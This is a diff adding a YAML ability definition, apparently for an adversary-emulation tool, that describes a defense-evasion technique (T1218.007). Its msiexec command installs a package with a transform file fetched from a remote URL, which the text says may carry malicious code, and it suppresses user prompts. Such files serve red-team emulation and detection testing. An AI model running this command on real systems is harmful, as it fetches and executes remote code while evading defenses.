@@ -1,0 +1,25 @@
+- id: f2f2fed2-cedb-4f03-5c96-d40669f300df
+  name: Msiexec.exe - Installs the target .MSI file from a remote URL, the file can
+    be signed by vendor. Additional to the file a transformation file will be used,
+    which can contains malicious code or binaries. The /qb will skip user input.
+  description: Installs the target .MSI file from a remote URL, the file can be signed
+    by vendor. Additional to the file a transformation file will be used, which can
+    contains malicious code or binaries. The /qb will skip user input.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.007
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'msiexec /i #{host.dir.temp} TRANSFORMS="{REMOTEURL:.mst}" /qb'
+  singleton: true
+  privilege: User
+  repeatable: false
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
